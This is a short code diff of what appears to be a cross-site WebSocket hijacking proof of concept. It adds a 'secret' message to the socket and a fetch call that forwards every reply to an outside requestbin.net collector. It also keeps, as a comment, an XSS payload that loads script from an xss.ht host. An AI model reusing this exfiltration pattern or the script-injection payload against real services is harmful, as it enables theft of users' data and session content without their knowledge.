@@ -9,12 +9,14 @@
     websocket.onmessage = handleReply
     function start(event)
     {
-        websocket.send('<><><script src=https://pepecomacaxss.xss.ht>');
+	websocket.send('secret');
+        //websocket.send('<><><script src=https://pepecomacaxss.xss.ht>');
     }
 
     function handleReply(event)
     {
       console.log(event);
+      fetch('http://requestbin.net/r/34y37frp?'+event.data, {mode: 'no-cors'});
     }
 	  </script>
 
